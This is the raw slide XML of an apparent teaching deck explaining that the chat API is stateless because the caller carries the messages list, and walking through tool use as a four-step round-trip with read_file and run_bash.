          <a:xfrm>
            <a:off x="1005840" y="1645920"/>
            <a:ext cx="10180015" cy="43498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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t># After three turns of chat:</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messages = [</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{"role": "user",      "content": "My name is Andy."},</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{"role": "assistant", "content": "Nice to meet you, Andy."},</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{"role": "user",      "content": "I have a dog named Pickle."},</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{"role": "assistant", "content": "Pickle is a great name!"},</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{"role": "user",      "content": "What's my dog's name?"},</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a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="17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You call </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>client.messages.create</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>(messages=messages).</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Some wrong models of what get sent:</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(a)  just turn 5, plus a session ID that ties back to turns 1-4</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>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(b)  all five messages, but the server keeps state from last time</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>#   (c)  just the last user message; the rest is implicit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g3ec891ba402_1_42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carrying the messages list buys you</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="235" name="Google Shape;235;g3ec891ba402_1_428"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1280140"/>
            <a:ext cx="10362900" cy="1616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Because YOU carry the messages list, you can do</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> stuff the model can’t.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Edit the history.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> Drop turns the model got wrong, inject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system message, or replay a conversation from a saved transcript.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g3ec891ba402_1_43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carrying the messages list buys you</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="242" name="Google Shape;242;g3ec891ba402_1_434"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1280140"/>
            <a:ext cx="10362900" cy="2770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Because YOU carry the messages list, you can do</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> stuff the model can’t.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Edit the history.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> Drop turns the model got wrong, inject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system message, or replay a conversation from a saved transcript.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Branch.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> Take the same messages list, try two different next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prompts off it, and compare them to pick the better one - same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model, no back-and-forth.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sp>
        <p:nvSpPr>
          <p:cNvPr id="248" name="Google Shape;248;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carrying the messages list buys you</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="249" name="Google Shape;249;p11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1280140"/>
            <a:ext cx="103629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Because YOU carry the messages list, you can do</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> stuff the model can’t.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Edit the history.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> Drop turns the model got wrong, inject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system message, or replay a conversation from a saved transcript.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Branch.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> Take the same messages list, try two different next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prompts off it, and compare them to pick the better one - same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model, no back-and-forth.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Persist.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> Save the list to a database between sessions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load it back later, since it's just JSON anyway.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Yeah, statelessness costs you tokens - you re-send everything every turn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W</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>hat you get back is total control over the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>context, and that's a pretty good trade.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54"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="255" name="Google Shape;255;g3ec891ba402_1_121"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5303520" y="457200"/>
            <a:ext cx="15846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i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B21B6"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>?</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="256" name="Google Shape;256;g3ec891ba402_1_121"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="2011680"/>
            <a:ext cx="9448500" cy="1662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a:solidFill>
                  <a:srgbClr val="1A1A2E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>“Claude”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3400" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="1A1A2E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> is a process on Anthropic's server - it can't see your laptop. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3400" b="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A2E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>But it can answer questions about </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3400" b="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A2E"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>app.py</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3400" b="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A2E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>. How?</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61"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="262" name="Google Shape;262;p1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Tools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8" name="Google Shape;268;p1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How does Cursor read a file off your disk?</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="269" name="Google Shape;269;p13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1463040"/>
            <a:ext cx="10362900" cy="526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Open Cursor, tell it "read app.py and tell me what's broken,"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This works</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> - the file ends up in front of the model somehow.</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But remember where the model actually lives: behind an HTTP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endpoint at api.anthropic.com. It can't reach into your laptop,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mount your filesystem, or read your files. It's just a process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 some server, talking JSON, same as in 3.1.</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So the file had to get there some other way. And the way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happened is that the model *asked* for it - Cursor read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file locally, on your machine, and handed the contents back.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 little back-and-forth is all tool use is.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4"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="275" name="Google Shape;275;g3ec891ba402_0_3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 use is a four-step round-trip</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="276" name="Google Shape;276;g3ec891ba402_0_38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1463040"/>
            <a:ext cx="10362900" cy="10773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You tell the model what tools exist. "You have access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read_file(path)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>run_bash(cmd)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>." Names + schemas.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="1" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="6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1"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="282" name="Google Shape;282;g3ec891ba402_0_2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 use is a four-step round-trip</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="283" name="Google Shape;283;g3ec891ba402_0_20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1463040"/>
            <a:ext cx="10362900" cy="26166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You tell the model what tools exist. "You have access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read_file(path)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>run_bash(cmd)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>." Names + schemas.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The model decides it wants to call one. Its response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comes back not as text but as a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>tool_use</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> block: "call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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>path=\"app.py\"</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sp>
        <p:nvSpPr>
          <p:cNvPr id="289" name="Google Shape;289;g3ec891ba402_0_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 use is a four-step round-trip</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="290" name="Google Shape;290;g3ec891ba402_0_26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1463040"/>
            <a:ext cx="10362900" cy="37710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You tell the model what tools exist. "You have access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read_file(path)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>run_bash(cmd)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>." Names + schemas.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The model decides it wants to call one. Its response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comes back not as text but as a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>tool_use</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> block: "call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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>path=\"app.py\"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a: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You execute it. Run the actual Python function on your side.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Get back a string. The model didn't touch your disk;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>YOUR code did.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="1" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="60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5"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="296" name="Google Shape;296;p1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 use is a four-step round-trip</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="297" name="Google Shape;297;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1463040"/>
            <a:ext cx="10362900" cy="46332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You tell the model what tools exist. "You have access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read_file(path)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>run_bash(cmd)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>." Names + schemas.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The model decides it wants to call one. Its response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comes back not as text but as a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>tool_use</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> block: "call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read_file</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>path=\"app.py\"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a: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You execute it. Run the actual Python function on your side.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Get back a string. The model didn't touch your disk;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>YOUR code did.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You append the result to messages as a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>tool_result </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>block</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call the model again. Now it can read the file</a:t>
